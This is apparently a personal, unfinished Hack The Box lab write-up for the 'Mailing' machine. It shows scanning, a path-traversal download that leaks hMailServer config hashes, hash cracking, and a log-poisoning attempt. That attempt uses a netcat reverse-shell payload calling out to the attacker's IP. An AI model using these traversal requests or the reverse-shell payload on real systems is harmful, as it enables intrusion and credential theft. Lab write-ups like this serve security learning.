# Enumeration

Starting with the nmap... 

`nmap -sC -sV -Pn 10.10.11.14`

This finds:
```
PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp open  pop3          hMailServer pop3d
|_pop3-capabilities: TOP USER UIDL
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
|_imap-capabilities: NAMESPACE RIGHTS=texkA0001 ACL SORT completed CAPABILITY IMAP4rev1 OK QUOTA IMAP4 CHILDREN IDLE
445/tcp open  microsoft-ds?
465/tcp open  ssl/smtp      hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
587/tcp open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
993/tcp open  ssl/imap      hMailServer imapd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: NAMESPACE RIGHTS=texkA0001 ACL SORT completed CAPABILITY IMAP4rev1 OK QUOTA IMAP4 CHILDREN IDLE
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-05-18T17:57:19
|_  start_date: N/A
|_clock-skew: -1s
```

There is an http server here that redirects to http://mailing.htb so lets add this to etc hosts first.

`echo '10.10.11.14 mailing.htb' | sudo tee -a /etc/hosts`

Lets check out the page.

Couple of things jump out at me on this page, it says it's a mailing server powered by hMailServer. Seems a likely avenue of weekness. 

I also see that there are three people listed, which might help with privesc later.

Finally there is a file to download that explains how to connect. 

Checking the vulns for hmailserver, it seems there are only ones for DOS which isn't neccessarily what I want. Plus all of them are old.

Perhaps the vuln here is not sanatizing the email.

I notice in the instructions that they tell me they are using user:password

It also reveals an account called maya@mailing.htb.

Doesn't seem to want me add that user account to my email.

So we probably need to find a way to create a user. Or steal someone elses info. That maya user is tempting... but I don't know how we could parse for her password.

Lets fuzz for other pages.

`ffuf -w /Users/noneya/Useful/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://mailing.htb/FUZZ -ic`

Interesting there are two directories we have direct access to and it shows the contenst of the folders on the page.

Lets fuzz for an index page:
`ffuf -w /Users/noneya/Useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://mailing.htb/indexFUZZ`

Seems to be a php web server. Lets fuzz for php pages.
`ffuf -w /Users/noneya/Useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://mailing.htb/FUZZ -recursion -recursion-depth 1 -e .php -v -ic`


Interesting there is a download.php file and it lets me just define what file I want to download...

Can I use it to download /etc/passwd. Oh hmm this is a windows server.

Trying C:\Windows\System32\drivers\etc\hosts doesn't work... 

I can definitely use it to download other files.. using this works `..%2Fassets%2Fbackground_image.jpg`

Maybe I can download, download.php? 

Yup `GET /download.php?file=..%2fdownload.php`

``` php
<?php
if (isset($_GET['file'])) {
    $file = $_GET['file'];

    $file_path = 'C:/wwwroot/instructions/' . $file;
    if (file_exists($file_path)) {
        
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file_path).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        echo(file_get_contents($file_path));
        exit;
    } else {
        echo "File not found.";
    }
} else {
    echo "No file specified for download.";
}
?>
```

Be nice to see whats in wwwroot. I checked index.php but its pretty boring.

I don't see any way to do command injection with this

I suppose I could use a custom curl script to fuzz for files...

What if I try `../../Windows/System32/drivers/etc/hosts`

Hello. That works. So I can access mor ethan what is wwwroot. I'll bet if I wanted to I could just use this to get the user flag if I tried hard enough. But that isn't the point.

We know of 3 users. But don't really have a way of knowing file names in their directories. I could totally just brute force it and try and fuzz for common names but that seems clunky and not the point.

I found [this page](https://vk9-sec.com/windows-interesting-files/) with interesting files to pull.

I parsed those and put them in a file now I am going to fuzz for these.

Hmm /php/php.ini exists and it has this line...
```
;;;;;;;;;;;;;;;;;;;;
; php.ini Options  ;
;;;;;;;;;;;;;;;;;;;;
; Name for user-defined php.ini (.htaccess) files. Default is ".user.ini"
;user_ini.filename = ".user.ini"

; To disable this feature set this option to an empty value
;user_ini.filename =

; TTL for user-defined php.ini files (time-to-live) in seconds. Default is 300 seconds (5 minutes)
;user_ini.cache_ttl = 300
```

I also see this.
```
;;;;;;;;;;;;;;;;
; File Uploads ;
;;;;;;;;;;;;;;;;

; Whether to allow HTTP file uploads.
; https://php.net/file-uploads
file_uploads = On

; Temporary directory for HTTP uploaded files (will use system default if not
; specified).
; https://php.net/upload-tmp-dir
;upload_tmp_dir =

; Maximum allowed size for uploaded files.
; https://php.net/upload-max-filesize
upload_max_filesize = 2M

; Maximum number of files that can be uploaded via a single request
max_file_uploads = 20
```

Am I missing something here and there is an easy way to upload a reverse shell?

Okay with a TON of research I found [this page](https://benheater.com/hackthebox-mailing/) (which at the time of working on this does not have the answers, but will in the future). It mentions interesting INI files... and tells me that the instructions on the server are not accidental...

I took this as a hint that hey I should be paying attention to mail server. 

So I researched vulnerable files on hmailserver: https://www.exploit-db.com/exploits/7012

And then I found this file Program Files (x86)/hMailServer/Bin/hMailServer.ini

When I download it I get:
```
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```

But I still have no idea how to leverage this...

I could try to hashcat the passwords and just assume the admin is Ruy since hes on the IT team.

So i found [this page](https://a3h1nt.medium.com/from-local-file-inclusion-to-reverse-shell-774fe61b7e1e) about how to leverage Local File Inclusion to get a reverse shell.

Lets try this. Changing the user agent to this: `<? passthru(“nc -e /bin/sh 10.10.14.137 4444”); ?>`

And starting a netcate on 4444

I get bad request poorly formed.

And I don't see an easy way to get the other type of file on windows.
 Maybe I crack those hashes and try and try to get on the mail server.

Seems to be an md5 hash.
`hashcat --force -m 0 hash.txt /Users/noneya/Useful/Wordlists/rockyou.txt`

841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator

Doesn't seem the other password is crackable.

I can't access the mail server with ruy@mailing.htb, admin@mailing.htb, or maya@mailing.htb

I'm stumped and the discussion posts here are not helpful.

So I asked on the discussion board and they mentioned trying to get access on smtp.

Some research finds [this page](https://www.comparitech.com/net-admin/telnet-smtp-test/)

When I connect using `telnet mailing.htb 587` I get connected and can run:
```
EHLO mailing.htb
AUTH LOGIN
```

But it asks for the username and password and nothing I try works. The cracked password I got above doesn't work. 

So I am thinking the next steps here is figuring out how to leverage this connection to send get a reverse shell.

I found [this](https://janithmalinga.github.io/redteam/ctf/2020/02/12/Using-LFI-and-SMTP-to-get-a-Shell.html) and the hmailserver documentation mentions that all emails are stored here:
`C:\Program Files\hMailServer\Data`

Once again stumped. I'm sure I am missing something simple. I feel like I could get the reverse shell with access to the server, but I can't authenticate.
